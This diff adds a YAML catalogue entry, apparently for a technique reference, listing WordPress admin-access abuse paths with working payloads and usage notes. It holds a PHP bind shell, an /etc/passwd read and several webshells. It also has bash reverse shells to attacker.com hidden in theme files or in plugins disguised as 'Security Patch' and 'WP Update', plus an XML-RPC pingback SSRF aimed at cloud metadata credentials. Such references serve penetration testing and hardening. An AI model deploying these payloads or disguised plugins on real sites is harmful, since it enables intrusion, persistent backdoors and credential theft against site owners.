@@ -1,0 +1,119 @@
+---
+comment: |
+  WordPress provides multiple code execution vectors to users with administrative access.
+  The most direct paths are the built-in theme/plugin PHP file editors (Appearance > Theme
+  File Editor, Plugins > Plugin File Editor) and the ability to install arbitrary plugins or themes.
+  These features are enabled by default; `DISALLOW_FILE_EDIT` and `DISALLOW_FILE_MODS` constants
+  disable them when set in `wp-config.php`.
+functions:
+  bind-shell:
+  - code: |
+      <?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",12345);socket_listen($s,1);$c=socket_accept($s);$p=proc_open("/bin/sh",array(0=>$c,1=>$c,2=>$c),$x); ?>
+    comment: |
+      Inject into an active theme file via the Theme File Editor. The page hangs while the
+      bind shell awaits a connection on TCP port 12345. Requires the PHP sockets extension
+      (enabled by default on most LAMP stacks). Connect with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      admin:
+    tty: false
+  file-read:
+  - code: |
+      <?php echo file_get_contents('/etc/passwd'); ?>
+    comment: |
+      Read an arbitrary server-side file by injecting into a theme file. The output is rendered
+      in the HTTP response body when any page is requested.
+    contexts:
+      admin:
+  file-write:
+  - code: |
+      <?php file_put_contents(ABSPATH . 'wp-content/uploads/shell.php', '<?php system($_GET["c"]); ?>'); ?>
+    comment: |
+      Write a PHP webshell to a publicly accessible directory. The uploads directory is always
+      world-readable and writable by the web server process.
+      Access the shell at: http://victim.com/wp-content/uploads/shell.php?c=id
+    contexts:
+      admin:
+  rce:
+  - code: |
+      <?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
+    comment: |
+      Inject a PHP one-liner into an active theme file (e.g., `functions.php`) via the Theme
+      File Editor at `/wp-admin/theme-editor.php`. Trigger by visiting any page on the site,
+      then pass commands via the `cmd` GET parameter.
+    contexts:
+      admin:
+  reverse-shell:
+  - blind: true
+    code: |
+      <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &"); ?>
+    comment: "Edit an active theme file (e.g., `404.php` under Appearance > Theme\
+      \ File Editor) and\ninsert this payload. Trigger by navigating to a non-existent\
+      \ page on the site to load\nthe 404 template. The shell runs asynchronously\
+      \ via the trailing `&` \u2014 the HTTP response\nwill not confirm execution;\
+      \ check the listener for the incoming connection.\n"
+    contexts:
+      admin:
+    listener: tcp-server
+    tty: false
+  - blind: true
+    code: |
+      <?php
+      /*
+      Plugin Name: Security Patch
+      */
+      exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &");
+      ?>
+    comment: "A plugin containing this PHP file will be executed on every page load\
+      \ once activated.\nPackage the file in a ZIP as `malicious/malicious.php` and\
+      \ upload via\nPlugins > Add New > Upload Plugin. The shell runs asynchronously\
+      \ \u2014 check the listener.\n"
+    contexts:
+      admin:
+      plugin:
+    listener: tcp-server
+    tty: false
+  ssrf:
+  - code: |
+      curl -s -X POST "http://victim.com/xmlrpc.php" \
+        -H "Content-Type: text/xml" \
+        -d '<?xml version="1.0" encoding="UTF-8"?>
+      <methodCall>
+        <methodName>pingback.ping</methodName>
+        <params>
+          <param><value><string>http://169.254.169.254/latest/meta-data/iam/security-credentials/</string></value></param>
+          <param><value><string>http://victim.com/</string></value></param>
+        </params>
+      </methodCall>'
+    comment: "WordPress XML-RPC exposes a `pingback.ping` method that makes an outbound\
+      \ HTTP GET\nrequest to the first parameter URL on behalf of the server. The\
+      \ second parameter must\nbe any valid WordPress page URL on the target site.\n\
+      \nThe XML-RPC response reflects the HTTP status of the outbound request \u2014\
+      \ a fault code\nof `0` or `17` indicates the target responded, revealing open\
+      \ internal ports (semi-blind\nSSRF). Use to probe cloud metadata endpoints:\n\
+      - AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n-\
+      \ GCP: http://metadata.google.internal/computeMetadata/v1/\n- Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\
+      \nXML-RPC is enabled by default. If disabled, the REST API with server-side\
+      \ URL fetching\n(e.g., oEmbed endpoint: /wp-json/oembed/1.0/proxy?url=<target>)\
+      \ may be an alternative.\n"
+    contexts:
+      unauthenticated:
+  webshell:
+  - code: |
+      <?php
+      /*
+      Plugin Name: WP Update
+      */
+      $shell = plugin_dir_path(__FILE__) . 'shell.php';
+      if (!file_exists($shell)) {
+          file_put_contents($shell, '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>');
+      }
+      ?>
+    comment: |
+      A minimal plugin that exposes a persistent webshell at `/wp-content/plugins/wp-update/shell.php`.
+      Package as `wp-update/wp-update.php` in a ZIP and install via Plugins > Add New > Upload Plugin.
+      Access the shell at: http://victim.com/wp-content/plugins/wp-update/shell.php?c=id
+    contexts:
+      admin:
+      plugin:
+...
